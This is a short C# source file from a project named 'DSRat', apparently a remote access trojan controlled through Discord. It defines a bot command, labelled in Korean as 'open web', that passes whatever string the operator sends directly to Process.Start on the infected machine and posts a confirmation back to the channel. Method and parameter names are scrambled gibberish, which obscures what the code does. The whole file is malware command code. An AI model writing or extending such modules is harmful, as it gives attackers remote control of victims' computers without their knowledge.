using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DSRat
{
    public class WebStart : ModuleBase<SocketCommandContext>
    {
        [Command("웹열기")]
        public async Task WEBHDBSKDfbsdkvbhvlblbi2NKAJND678687(string sgjsgdojsvnjdsvnjkDNKLJBSDVKLBKLio129329)
        {
            System.Diagnostics.Process.Start(sgjsgdojsvnjdsvnjkDNKLJBSDVKLBKLio129329);
            await Context.Channel.SendMessageAsync(sgjsgdojsvnjdsvnjkDNKLJBSDVKLBKLio129329 + "을 열었습니다.");
        }
    }
}
